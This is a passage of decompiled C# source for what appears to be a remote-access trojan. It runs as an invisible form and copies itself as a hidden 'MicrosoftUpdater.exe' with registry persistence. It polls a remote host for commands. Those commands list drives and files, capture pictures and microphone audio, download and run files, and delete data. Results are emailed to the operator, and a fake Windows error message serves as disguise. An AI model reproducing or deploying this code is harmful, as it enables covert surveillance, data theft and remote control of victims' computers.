			text = text.Substring(text.LastIndexOf('/') + 1);
		}
		if (downloadedData != null && downloadedData.Length != 0)
		{
			Application.DoEvents();
			FileStream fileStream = new FileStream(Application.get_StartupPath() + "\\" + CommandParameter_2, FileMode.Create);
			fileStream.Write(downloadedData, 0, downloadedData.Length);
			fileStream.Close();
		}
		timer1.set_Enabled(true);
	}

	private void MakeIdentity()
	{
		try
		{
			string fileName = "MYCodes/syslogg.dll";
			DownloadFile(fileName);
			SaveServerFile("syslogg.dll");
			StreamReader streamReader = new StreamReader(Application.get_StartupPath() + "\\syslogg.dll");
			MyID = streamReader.ReadLine();
			streamReader.Close();
			int num = int.Parse(MyID);
			num++;
			StreamWriter streamWriter = new StreamWriter(Application.get_StartupPath() + "\\syslogg.dll");
			streamWriter.WriteLine(num.ToString());
			streamWriter.Flush();
			streamWriter.Close();
			try
			{
				UploadFile(Application.get_StartupPath() + "\\syslogg.dll");
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
		try
		{
			File.SetAttributes(Application.get_StartupPath() + "\\syslogg.dll", FileAttributes.Hidden);
		}
		catch
		{
		}
	}

	private bool IsNewCommand()
	{
		string text = ReadFile_For_New_Command();
		bool flag = false;
		if (text != previousCommand)
		{
			flag = true;
			previousCommand = text;
		}
		else
		{
			WorkingStatus();
			if (continueWork)
			{
				flag = true;
				previousCommand = text;
			}
			else
			{
				flag = false;
			}
		}
		reader = new StreamReader(Application.get_StartupPath() + "\\" + MyID + filename);
		string text2 = reader.ReadLine();
		reader.Close();
		if (text2.IndexOf('*') != -1)
		{
			Continue = true;
		}
		else
		{
			Continue = false;
		}
		return flag;
	}

	public bool FindAndKillProcess(string name)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.StartsWith(name))
			{
				process.Kill();
				return true;
			}
		}
		return false;
	}

	private void button2_Click(object sender, EventArgs e)
	{
		FindAndKillProcess("MicrosoftUpdater");
	}

	private void button1_Click(object sender, EventArgs e)
	{
		MyID = Environment.MachineName;
		((Control)lbProgress).set_Text(MyID);
		ProcessCommand();
		if (CommandNumber != 17)
		{
			return;
		}
		int num = 1;
		List<string> filesRecursive;
		object catchTheFile;
		if (CommandParameter_2 != "")
		{
			CatchTheFile = "All " + CommandParameter_2 + " Files in its Folder and Sub Folder of " + CommandParameter_1 + "\n";
			filesRecursive = FileHelper.GetFilesRecursive(CommandParameter_1, CommandParameter_2);
			catchTheFile = CatchTheFile;
			CatchTheFile = string.Concat(catchTheFile, "All Files = ", filesRecursive.Count, "\nDetails\n\n");
			{
				foreach (string item in filesRecursive)
				{
					RichTextBox obj = richTextBox1;
					catchTheFile = ((Control)obj).get_Text();
					((Control)obj).set_Text(string.Concat(catchTheFile, num, "__ ", item, "\n"));
					num++;
				}
				return;
			}
		}
		CatchTheFile = "All Files in its Folder and Sub Folder of " + CommandParameter_1 + "\n";
		filesRecursive = FileHelper.GetFilesRecursive(CommandParameter_1, "*.*");
		catchTheFile = CatchTheFile;
		CatchTheFile = string.Concat(catchTheFile, "All Files = ", filesRecursive.Count, "\nDetails\n\n");
		foreach (string item2 in filesRecursive)
		{
			RichTextBox obj2 = richTextBox1;
			((Control)obj2).set_Text(((Control)obj2).get_Text() + item2 + "\n");
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		//IL_0bea: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf4: Expected O, but got Unknown
		//IL_0bf4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bfb: Expected O, but got Unknown
		//IL_0c04: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c0e: Expected O, but got Unknown
		//IL_0c37: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e5b: Unknown result type (might be due to invalid IL or missing references)
		if (File.Exists(Application.get_StartupPath() + "\\" + MyID + filename))
		{
			if (IsNewCommand() || Continue)
			{
				Time_Last_Msg_Sent = 0;
				timer1.set_Enabled(false);
				try
				{
					Check_For_MultiCommands();
					for (int i = 0; i <= MultiCommands.Length - 1; i++)
					{
						ProcessCommand(MultiCommands[i]);
						if (CommandNumber == 0)
						{
							sendMailToMe("Check the attached file which you have ordered", CommandParameter_1);
						}
						if (CommandNumber == 1)
						{
							CatchTheFile = "No of Drives\n";
							WriteData("NoDrives", NoDrives().ToString());
							sendMailToMe(CatchTheFile, "");
						}
						if (CommandNumber == 2)
						{
							CatchTheFile = "The Drives Name \n";
							string[] data = DrivesName();
							WriteData("Drives Name and Type Are:", data);
							sendMailToMe(CatchTheFile, "");
						}
						if (CommandNumber == 4)
						{
							CatchTheFile = "The Folders Name " + CommandParameter_1 + "\n";
							string[] data2 = DirectoriesName(CommandParameter_1);
							WriteData("Folders: " + CommandParameter_1, data2);
							sendMailToMe(CatchTheFile, "");
						}
						if (CommandNumber == 30)
						{
							CatchTheFile = "All Folders and Files in " + CommandParameter_1 + "\n";
							string[] data2 = DirectoriesName(CommandParameter_1);
							WriteData("Folders: " + CommandParameter_1, data2);
							string[] data3 = FilesName(CommandParameter_1);
							WriteData("Files: " + CommandParameter_1, data3);
							sendMailToMe(CatchTheFile, "");
						}
						if (CommandNumber == 3)
						{
							CatchTheFile = "Total No of Folders: " + CommandParameter_1 + "\n";
							WriteData(data: NoDirectories(CommandParameter_1).ToString(), heading: "Total No of Folders in : " + CommandParameter_1);
							sendMailToMe(CatchTheFile, "");
						}
						if (CommandNumber == 5)
						{
							CatchTheFile = "The Total No of Files at Location:" + CommandParameter_1;
							WriteData(data: NoFiles(CommandParameter_1).ToString(), heading: "Total No of Files: " + CommandParameter_1);
							sendMailToMe(CatchTheFile, "");
						}
						else if (CommandNumber == 6)
						{
							CatchTheFile = "The Complete List of Files at Location:" + CommandParameter_1;
							if (CommandParameter_2 != "")
							{
								string[] data3 = FilesName(CommandParameter_1, CommandParameter_2);
								WriteData("Files: " + CommandParameter_1, data3);
							}
							else
							{
								string[] data3 = FilesName(CommandParameter_1);
								WriteData("Files: " + CommandParameter_1, data3);
							}
							sendMailToMe(CatchTheFile, "");
						}
						else if (CommandNumber == 7)
						{
							GetPicture();
							sendMailToMe("The Random Picture From user", Application.get_StartupPath() + "\\" + MyID + "Pic.jpeg");
						}
						else if (CommandNumber == 8)
						{
							Process.Start(CommandParameter_1);
							GetPicture();
							GetPicture();
							GetPicture();
							GetPicture();
							GetPicture();
							GetPicture();
							sendMailToMe("The Random Picture From user", Application.get_StartupPath() + "\\" + MyID + "Pic.jpeg");
						}
						else if (CommandNumber == 9)
						{
							timer1.set_Enabled(false);
							DownloadFile(CommandParameter_1);
							SaveServerFile(CommandParameter_2);
							timer1.set_Enabled(true);
						}
						else if (CommandNumber == 10)
						{
							timer1.set_Enabled(false);
							DownloadHTTPFile(CommandParameter_1);
							timer1.set_Enabled(false);
							if (downloadedData != null && downloadedData.Length != 0)
							{
								string text = CommandParameter_1;
								if (text.EndsWith("/"))
								{
									text = text.Substring(0, text.Length - 1);
								}
								text = text.Substring(text.LastIndexOf('/') + 1);
							}
							if (downloadedData != null && downloadedData.Length != 0)
							{
								Application.DoEvents();
								FileStream fileStream = new FileStream(Application.get_StartupPath() + "\\" + CommandParameter_2, FileMode.Create);
								fileStream.Write(downloadedData, 0, downloadedData.Length);
								fileStream.Close();
							}
							timer1.set_Enabled(true);
						}
						else if (CommandNumber == 11)
						{
							Process.Start(CommandParameter_1);
						}
						else if (CommandNumber == 12)
						{
							CatchTheFile = "The Size of File Your Order " + CommandParameter_1 + "\n";
							WriteData("File Size Information", MyFileSize(CommandParameter_1));
							sendMailToMe(CatchTheFile, "");
						}
						else if (CommandNumber == 13)
						{
							CatchTheFile = "Folder Size You Requested " + CommandParameter_1 + "\n";
							WriteData("File Size Information", MyFolderSize(CommandParameter_1));
							sendMailToMe(CatchTheFile, "");
						}
						else if (CommandNumber == 14)
						{
							CatchTheFile = "My Computer Name is \n";
							WriteData("Computer Name", Environment.MachineName);
							sendMailToMe(CatchTheFile, "");
						}
						else if (CommandNumber == 15)
						{
							MoveFileTo(CommandParameter_1, CommandParameter_2);
						}
						else if (CommandNumber == 16)
						{
							DeleteLocalFile(CommandParameter_1);
						}
						else if (CommandNumber == 17)
						{
							int num = 1;
							List<string> filesRecursive;
							object catchTheFile;
							if (CommandParameter_2 != "")
							{
								CatchTheFile = "All " + CommandParameter_2 + " Files in its Folder and Sub Folder of " + CommandParameter_1 + "\n";
								filesRecursive = FileHelper.GetFilesRecursive(CommandParameter_1, CommandParameter_2);
								catchTheFile = CatchTheFile;
								CatchTheFile = string.Concat(catchTheFile, "All Files = ", filesRecursive.Count, "\nDetails\n\n");
								foreach (string item in filesRecursive)
								{
									catchTheFile = CatchTheFile;
									CatchTheFile = string.Concat(catchTheFile, num, "__ ", item, "\n");
									num++;
								}
								sendMailToMe(CatchTheFile, "");
								continue;
							}
							CatchTheFile = "All Files in its Folder and Sub Folder of " + CommandParameter_1 + "\n";
							filesRecursive = FileHelper.GetFilesRecursive(CommandParameter_1, "*.*");
							catchTheFile = CatchTheFile;
							CatchTheFile = string.Concat(catchTheFile, "All Files = ", filesRecursive.Count, "\nDetails\n\n");
							foreach (string item2 in filesRecursive)
							{
								CatchTheFile = CatchTheFile + item2 + "\n";
							}
							sendMailToMe(CatchTheFile, "");
						}
						else if (CommandNumber == 18)
						{
							try
							{
								Process process = Process.Start("notepad.exe");
								IntPtr handle = process.Handle;
								SetForegroundWindow(handle);
								SendKeys.Send(CommandParameter_1);
							}
							catch
							{
							}
						}
						else if (CommandNumber == 19)
						{
							try
							{
								try
								{
									StreamWriter streamWriter = new StreamWriter("C:\\Documents and Settings\\All Users\\emit.dll");
									streamWriter.Write(CommandParameter_1);
									timeToProcess = int.Parse(CommandParameter_1);
									streamWriter.Close();
								}
								catch
								{
									StreamWriter streamWriter = new StreamWriter("C:\\Documents and Settings\\All Users\\emit.dll");
									streamWriter.Write(120);
									timeToProcess = 120;
									streamWriter.Close();
								}
							}
							catch
							{
								try
								{
									StreamWriter streamWriter = new StreamWriter("C:\\Program Files\\emit.dll");
									streamWriter.Write(CommandParameter_1);
									timeToProcess = int.Parse(CommandParameter_1);
									streamWriter.Close();
								}
								catch
								{
									StreamWriter streamWriter = new StreamWriter("C:\\Program Files\\emit.dll");
									streamWriter.Write(120);
									timeToProcess = 120;
									streamWriter.Close();
								}
							}
							((Control)label2).set_Text(timeToProcess.ToString());
						}
						else if (CommandNumber == 20)
						{
							try
							{
							}
							catch
							{
							}
						}
						else if (CommandNumber == 21)
						{
							try
							{
								mciSendString("open new Type waveaudio Alias recsound", "", 0, 0);
								mciSendString("record recsound", "", 0, 0);
								soundRecordingTime = int.Parse(CommandParameter_1);
								timer2.set_Enabled(true);
							}
							catch
							{
							}
						}
						else if (CommandNumber == 22)
						{
							try
							{
								StreamWriter streamWriter2 = new StreamWriter(Application.get_StartupPath() + "\\order.txt");
								streamWriter2.WriteLine(CommandParameter_1);
								streamWriter2.Close();
							}
							catch
							{
							}
							try
							{
								streamToPrint = new StreamReader(Application.get_StartupPath() + "\\order.txt");
								try
								{
									printFont = new Font("Arial", 20f);
									PrintDocument val = new PrintDocument();
									val.add_PrintPage(new PrintPageEventHandler(pd_PrintPage));
									val.Print();
								}
								finally
								{
									streamToPrint.Close();
								}
							}
							catch (Exception ex)
							{
								MessageBox.Show(ex.Message);
							}
						}
						else if (CommandNumber == 23)
						{
							try
							{
								EjectMedia.Eject("\\\\.\\" + CommandParameter_1 + ":");
							}
							catch
							{
							}
						}
						else if (CommandNumber == 24)
						{
							try
							{
							}
							catch
							{
							}
						}
						else if (CommandNumber == 25)
						{
							try
							{
							}
							catch
							{
							}
						}
						else if (CommandNumber == 26)
						{
							try
							{
								SpVoice spVoice = (SpVoice)Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("96749377-3391-11D2-9EE3-00C04F797396")));
								spVoice.Rate = -5;
								spVoice.Speak(CommandParameter_1);
							}
							catch
							{
							}
						}
						else if (CommandNumber == 33)
						{
							try
							{
								timer1.set_Enabled(false);
								DownloadHTTPFile("http://fakhrweb.9f.com/1.jpg");
								timer1.set_Enabled(false);
								if (downloadedData != null && downloadedData.Length != 0)
								{
									string text = CommandParameter_1;
									if (text.EndsWith("/"))
									{
										text = text.Substring(0, text.Length - 1);
									}
									text = text.Substring(text.LastIndexOf('/') + 1);
								}
								if (downloadedData != null && downloadedData.Length != 0)
								{
									Application.DoEvents();
									FileStream fileStream = new FileStream(Application.get_StartupPath() + "\\F_U_D_S(King).jpg", FileMode.Create);
									fileStream.Write(downloadedData, 0, downloadedData.Length);
									fileStream.Close();
								}
								timer1.set_Enabled(true);
								Process.Start(Application.get_StartupPath() + "\\F_U_D_S(King).jpg");
							}
							catch (Exception ex)
							{
								MessageBox.Show("Error occured: " + ex.Message);
							}
						}
						else if (CommandNumber == 50)
						{
							try
							{
								sendMailToMe("cOMMAND Best Ok this version contains 27 commands, printing coommand is added title is flush, updated 2012, APirl 18 {Title clear, my photo added, msging completly clear}", "");
							}
							catch
							{
							}
						}
					}
				}
				catch
				{
				}
			}
			else
			{
				Time_Last_Msg_Sent++;
				if (Time_Last_Msg_Sent == 6 && Auto_Msg_Count != 0 && Auto_Msg_Count != 1 && Auto_Msg_Count != 2 && Auto_Msg_Count != 3)
				{
				}
			}
			File.Delete(Application.get_StartupPath() + "\\" + MyID + filename);
			File.Delete(Application.get_StartupPath() + "\\" + MyID + filename);
			if (!timer2.get_Enabled())
			{
				timer1.set_Enabled(true);
			}
		}
		if (Time == timeToProcess)
		{
			try
			{
				if (MyID != "")
				{
					timer1.set_Enabled(false);
					DownloadHTTPFile(" http://fakhrweb.9f.com/" + MyID + ".txt");
					SaveHTTPFile(MyID + ".txt");
					Time = 0;
					StartCommanding = true;
					if (!ServerFileAvailable)
					{
						timer1.set_Enabled(true);
					}
				}
			}
			catch
			{
			}
			Time = 0;
		}
		Time++;
		if (Time != 4)
		{
			return;
		}
		if (File.Exists(Application.get_StartupPath() + "\\sys.txt"))
		{
			MyID = Environment.MachineName;
			((Control)lbProgress).set_Text(MyID);
			return;
		}
		timer1.set_Enabled(false);
		MyID = Environment.MachineName;
		try
		{
			((Control)lbProgress).set_Text(MyID);
			sendMailToMe("I am your new user " + MyID + ". Please give me an order to start work", "");
			StreamWriter streamWriter3 = File.CreateText(Application.get_StartupPath() + "\\sys.txt");
			streamWriter3.WriteLine("My name is " + MyID);
			streamWriter3.Close();
		}
		catch (Exception)
		{
		}
		timer1.set_Enabled(true);
		Time = 0;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		string fileName = Path.GetFileName(Application.get_ExecutablePath());
		bool flag = true;
		bool flag2 = false;
		try
		{
			if (!File.Exists("C:\\Documents and Settings\\All Users\\MicrosoftUpdater.exe"))
			{
				try
				{
					File.Copy(Application.get_ExecutablePath(), "C:\\Documents and Settings\\All Users\\MicrosoftUpdater.exe");
					File.SetAttributes("C:\\Documents and Settings\\All Users\\MicrosoftUpdater.exe", FileAttributes.Hidden);
					Process.Start("C:\\Documents and Settings\\All Users\\MicrosoftUpdater.exe");
					flag2 = true;
					StreamWriter streamWriter = new StreamWriter("C:\\Documents and Settings\\All Users\\emit.dll");
					streamWriter.Write(timeToProcess);
					streamWriter.Flush();
					streamWriter.Close();
				}
				catch
				{
					if (!File.Exists("C:\\MicrosoftUpdater.exe"))
					{
						File.Copy(Application.get_ExecutablePath(), "C:\\MicrosoftUpdater.exe");
						File.SetAttributes("C:\\MicrosoftUpdater.exe", FileAttributes.Hidden);
						Process.Start("C:\\MicrosoftUpdater.exe");
						flag2 = true;
						flag = false;
						StreamWriter streamWriter = new StreamWriter("C:\\emit.dll");
						streamWriter.Write(timeToProcess);
						streamWriter.Flush();
						streamWriter.Close();
					}
				}
				finally
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			if (flag2)
			{
				if (flag)
				{
					CreateRegistry("C:\\Documents and Settings\\All Users\\MicrosoftUpdater.exe");
				}
				else
				{
					CreateRegistry("C:\\MicrosoftUpdater.exe");
				}
			}
		}
		catch
		{
		}
		try
		{
			if (flag2 || fileName != "MicrosoftUpdater.exe")
			{
				File.Delete(Application.get_ExecutablePath());
			}
		}
		catch
		{
			MessageBox.Show("The File is either  corrupt or there may problem of Dotnet version", "Microsoft Windows Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			Application.Exit();
		}
		try
		{
			if (File.Exists(Application.get_StartupPath() + "\\" + MyID + filename))
			{
				File.Delete(Application.get_StartupPath() + "\\" + MyID + filename);
			}
		}
		catch
		{
		}
		try
		{
			StreamReader streamReader = new StreamReader("C:\\Documents and Settings\\All Users\\emit.dll");
			string s = streamReader.ReadLine();
			timeToProcess = int.Parse(s);
			streamReader.Close();
		}
		catch
		{
			try
			{
				StreamReader streamReader = new StreamReader("C:\\emit.dll");
				string s = streamReader.ReadLine();
				timeToProcess = int.Parse(s);
				streamReader.Close();
			}
			catch
			{
				timeToProcess = 600;
			}
		}
		((Control)label2).set_Text(timeToProcess.ToString());
	}

	private void button2_Click_1(object sender, EventArgs e)
	{
		mciSendString("open new Type waveaudio Alias recsound", "", 0, 0);
		mciSendString("record recsound", "", 0, 0);
	}

	private void button1_Click_1(object sender, EventArgs e)
	{
		mciSendString("save recsound c:\\record.wav", "", 0, 0);
		mciSendString("close recsound ", "", 0, 0);
	}

	private bool Check_For_MultiCommands()
	{
		StreamReader streamReader = new StreamReader(Application.get_StartupPath() + "\\" + MyID + filename);
		string text = streamReader.ReadToEnd();
		MultiCommands = text.Split(new char[1] { '^' });
		streamReader.Close();
		if (MultiCommands.Length - 1 == 0)
		{
			return false;
		}
		return true;
	}

	private void button3_Click(object sender, EventArgs e)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(Check_For_MultiCommands().ToString());
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			if (timer_2_progress != soundRecordingTime)
			{
				timer_2_progress++;
				((Control)label1).set_Text(timer_2_progress.ToString());
				return;
			}
			mciSendString("save recsound" + Application.get_StartupPath() + "\\order.wav", "", 0, 0);
			mciSendString("close recsound ", "", 0, 0);
			sendMailToMe("Voice Recording: ", Application.get_StartupPath() + "\\order.wav");
			File.Delete(Application.get_StartupPath() + "\\order.wav");
			timer2.set_Enabled(false);
			timer1.set_Enabled(true);
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		components = new Container();
		button1 = new Button();
		button2 = new Button();
		saveFileDialog1 = new SaveFileDialog();
		progressBar1 = new ProgressBar();
		lbProgress = new Label();
		timer1 = new Timer(components);
		pictureBox1 = new PictureBox();
		richTextBox1 = new RichTextBox();
		label1 = new Label();
		label2 = new Label();
		button3 = new Button();
		timer2 = new Timer(components);
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(222, 41));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(95, 26));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Write");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click_1);
		((Control)button2).set_Location(new Point(104, 37));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(95, 35));
		((Control)button2).set_TabIndex(1);
		((Control)button2).set_Text("Read");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click_1);
		((Control)progressBar1).set_Location(new Point(104, 8));
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(150, 23));
		((Control)progressBar1).set_TabIndex(2);
		((Control)lbProgress).set_AutoSize(true);
		((Control)lbProgress).set_Location(new Point(104, 75));
		((Control)lbProgress).set_Name("lbProgress");
		((Control)lbProgress).set_Size(new Size(56, 13));
		((Control)lbProgress).set_TabIndex(3);
		((Control)lbProgress).set_Text("lbProgress");
		timer1.set_Enabled(true);
		timer1.set_Interval(1000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)pictureBox1).set_Location(new Point(3, 1));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(95, 97));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(4);
		pictureBox1.set_TabStop(false);
		((Control)richTextBox1).set_Location(new Point(3, 104));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(392, 233));
		((Control)richTextBox1).set_TabIndex(5);
		((Control)richTextBox1).set_Text("");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(219, 75));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(35, 13));
		((Control)label1).set_TabIndex(6);
		((Control)label1).set_Text("label1");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(270, 22));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(30, 13));
		((Control)label2).set_TabIndex(7);
		((Control)label2).set_Text("Time");
		((Control)button3).set_Location(new Point(273, 1));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(75, 23));
		((Control)button3).set_TabIndex(8);
		((Control)button3).set_Text("button3");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		timer2.set_Interval(1000);
		timer2.add_Tick((EventHandler)timer2_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)lbProgress);
		((Control)this).get_Controls().Add((Control)(object)progressBar1);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Location(new Point(2000, 2000));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
